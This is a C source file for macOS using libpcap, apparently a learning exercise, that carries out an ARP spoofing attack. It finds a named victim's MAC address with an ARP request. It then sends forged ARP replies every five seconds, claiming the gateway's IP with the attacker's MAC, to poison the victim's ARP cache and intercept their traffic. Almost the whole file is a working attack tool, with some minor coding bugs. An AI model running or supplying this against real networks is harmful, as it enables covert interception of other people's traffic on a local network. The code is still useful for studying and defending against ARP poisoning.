#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>

//ARP Header
#define NETSTAT_IP_ADDR 	19
#define NETSTAT_GW_IP_SIZE 	16
#define ETHER_MACADDR_SIZE 	6
#define ETHER_PROTO_ARP 	0x0806
#define ETHER_PROTO_SIZE 	2

//ARP Header
#define ARP_HARDWARE_TYPE_SIZE 	2
#define ARP_PROTO_TYPE_SIZE 	2
#define ARP_OPCODE_SIZE 		2

//IP Header
#define IP_ADDR_SIZE 	4

#define ARP_REQEST 		0
#define ARP_REPLY		1


//gcc -o pcap pcap.c -lpcap
typedef struct Ethernet_Header {
	unsigned char dstMACaddr[6];
	unsigned char srcMACaddr[6];
	unsigned char type[4];	
} EthHeader;

int Ethernet_Header_Parsing (const u_char * packet, EthHeader * ethheader){
	int i;

	printf("\n"); 

	//Parse dst Mac address
	for (i = 0; i < 6; i++)
		ethheader->dstMACaddr[i] = (unsigned char)packet[i];

	//Parse src Mac address
	for (i = 0; i < 6; i++) 
		ethheader->srcMACaddr[i] = (unsigned char)packet[i + 6];

	for (i = 0; i < 2; i++)
		ethheader->type[i] = (unsigned char) packet[i + 12];
	
	return 0;
};

int gw_IP_Parsing (const unsigned char * gw_IP) {
	unsigned char pipe_buf[1024];
	unsigned char netstat_gw_IP[16];
	int arp_pipe[2];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/usr/sbin/netstat -n -r | grep default | awk '{print $2}'");	//In MAC OS, gate
		exit(1);
	}

	else {
		close(arp_pipe[1]);		// close for-write fd

		read(arp_pipe[0], pipe_buf, 1023);
		printf("gateway IP : %s", pipe_buf);

		inet_aton(pipe_buf, gw_IP);
	}

	return 0;
}

int own_IP_Parsing(const unsigned char * own_IP) {
	unsigned char pipe_buf[1024];
	int arp_pipe[2];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/sbin/ifconfig -a | grep inet | grep broadcast | awk '{print $2}'");
		exit(1);
	}

	else {
		close(arp_pipe[1]);		// close for-write fd
		read(arp_pipe[0], pipe_buf, 1023);

		inet_aton(pipe_buf, own_IP);

		printf("own IP address : %s", pipe_buf);
	}

	return 0;
}

int own_MAC_Parsing (const unsigned char * own_MACaddr) {
	unsigned char pipe_buf[1024];
	int arp_pipe[2];
	unsigned char temp;
	unsigned char tempMAC[17];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/sbin/ifconfig -a | grep ether | awk '{print $2}'");	// ifconfig path in MAC OS X : /sbin/ifconfig
		exit(1);
	}

	else {
		close(arp_pipe[1]);		// close for-write fd
		read(arp_pipe[0], pipe_buf, 1023);

		memcpy(tempMAC, pipe_buf, 17);		
		memcpy(own_MACaddr, ether_aton(tempMAC), 6);
	}

	return 0;
}

int Make_ARP_Packet (unsigned char * packet, unsigned char * senderMAC, unsigned char * senderIP, unsigned char * targetMAC, unsigned char * targetIP, int OPCODE) {
	int i = 0;
	int curAddr = 0;
	
	//Constructing Ethernet Header	
	memcpy(&packet[curAddr], targetMAC, ETHER_MACADDR_SIZE);	
	curAddr += ETHER_MACADDR_SIZE;
	
	memcpy(&packet[curAddr], senderMAC, ETHER_MACADDR_SIZE);
	curAddr += ETHER_MACADDR_SIZE;
	
	memcpy(&packet[curAddr], "\x08\x06", ETHER_PROTO_SIZE);
	curAddr += ETHER_PROTO_SIZE;
	
	//Hardware type : Ethernet
	memcpy(&packet[curAddr], "\x00\x01", ARP_HARDWARE_TYPE_SIZE);
	curAddr += ARP_HARDWARE_TYPE_SIZE;
	
	memcpy(&packet[curAddr], "\x08\x00", ARP_PROTO_TYPE_SIZE);
	curAddr += ARP_PROTO_TYPE_SIZE;

	//Hardware Size
	memcpy(&packet[curAddr], "\x06", 1);
	curAddr++;
	
	//Protocol Size
	memcpy(&packet[curAddr], "\x04", 1);
	curAddr++;	

	//OPCODE
	if (OPCODE == ARP_REQEST)
		memcpy(&packet[curAddr], "\x00\x01", ARP_OPCODE_SIZE);
	else
		memcpy(&packet[curAddr], "\x00\x02", ARP_OPCODE_SIZE);
	curAddr += ARP_OPCODE_SIZE;

	//senderMAC address
	memcpy(&packet[curAddr], senderMAC, ETHER_MACADDR_SIZE);
	curAddr += ETHER_MACADDR_SIZE;

	//sender IP address
	memcpy(&packet[curAddr], senderIP, IP_ADDR_SIZE);
	curAddr += IP_ADDR_SIZE;

	if (OPCODE == ARP_REQEST)
		memcpy(&packet[curAddr], "\x00\x00\x00\x00\x00\x00", ETHER_MACADDR_SIZE);
	else
		memcpy(&packet[curAddr], targetMAC, ETHER_MACADDR_SIZE);
	
	curAddr	+= ETHER_MACADDR_SIZE;

	memcpy(&packet[curAddr], targetIP, IP_ADDR_SIZE);
	curAddr += IP_ADDR_SIZE;

	return 0;
}

int PrintPacket(unsigned char * packet, int len) {
	int i = 0;

	for (i = 0; i < len; i++) {
		if (i == 0)				printf("%02X ",   packet[0]);
		else if ((i % 16) == 0)	printf("\n%02X ", packet[i]);
		else if ((i % 8) == 0)	printf(" %02X ",  packet[i]);
		else 					printf("%02X ",   packet[i]);
	}
	printf("\n");

	return 0;
}

int main (int argc, char * argv[]) {
	int i = 0;
	
	unsigned char own_IP[4];
	unsigned char gw_IP[4];
	unsigned char victim_IP[4];
	unsigned char victim_MACaddr[6];
	unsigned char gw_MACaddr[6];
	unsigned char own_MACaddr[6];
	unsigned char broadcastMAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	
	EthHeader ethheader;
	char * dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char * packet;
	pcap_t * pcd;		/*packet capture descriptor*/
	bpf_u_int32 mask;	/*netmask of device*/
	bpf_u_int32 net;	/*IP of device*/
	unsigned char arp_packet[42];
	struct pcap_pkthdr header;
	struct bpf_program fp;

	if (argc < 2) {
		printf("[*] Need Victim IP address\n");
		return -1;
	}

	printf("Find a device automatically...\n");
	dev = pcap_lookupdev(errbuf);
		
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find device : %s\n", errbuf);
		return 2;
	}
	
	printf("Device : %s\n", dev);	
	
	pcd = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
	if (pcd == NULL) {
		fprintf(stderr, "Cannot open device(%s) : %s\n", dev, errbuf);
		return 2;
	}
	
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Cannot get netmask for device(%s) : %s\n", dev, errbuf);
	}

	//examine data link Layer
	
	if ((pcap_datalink(pcd)) != DLT_EN10MB) {	//Capture ethernet packet only.
		fprintf(stderr, "Device %s does not provide Ethernet header", dev);
		return 2;
	}
	
	printf("Data-link Layer check completed...(type : Ethernet)\n");	

	inet_aton(argv[1], victim_IP);	// Save victim's IP. In MAC OS, there was no inet_aton_r API, which is re_entrant...
	gw_IP_Parsing(gw_IP);			// using netstat program, get IP address of gateway
	
	own_IP_Parsing(own_IP);			// using ifconfig program, get IP address of own system
	own_MAC_Parsing(own_MACaddr);
	Make_ARP_Packet(arp_packet, own_MACaddr, own_IP, broadcastMAC, victim_IP, ARP_REQEST); // With this Request, get vicim's MAC address...

	while (1) {
		//packet
		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));	//returns 0 if success
		printf("[*]SENDING : ARP REQUEST Packet\n");

		printf("\nCapturing ARP REPLY from victim...\n");
		packet = pcap_next(pcd, &header);

		
		if (packet == NULL)	//if packet is NULL, continue
			continue;

		Ethernet_Header_Parsing(packet, &ethheader);

		if (ntohs(*((unsigned short *)ethheader.type)) != ETHER_PROTO_ARP) 
			continue;

		if ( memcmp(&packet[28], victim_IP, 4) == 0) {
			memcpy(victim_MACaddr, ethheader.srcMACaddr, 6);
			printf("victim_MAC address : %02x:%02x:%02x:%02x:%02x:%02x\n", victim_MACaddr[0], victim_MACaddr[1], victim_MACaddr[2], victim_MACaddr[3], victim_MACaddr[4], victim_MACaddr[5],victim_MACaddr[6]);
			break;
		}

	}

	printf("Sending forged ARP REPLY packet...(disguising as gateway)\n");	
	Make_ARP_Packet (arp_packet, own_MACaddr, gw_IP, victim_MACaddr, victim_IP, ARP_REPLY);	

	printf("[ ARP REPLY PACKET INFO(FORGED) ]\n");
	PrintPacket(arp_packet, sizeof(arp_packet));

	while (1) {
		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
		printf("...\n");
		sleep(5);
	}

	return 0;
}










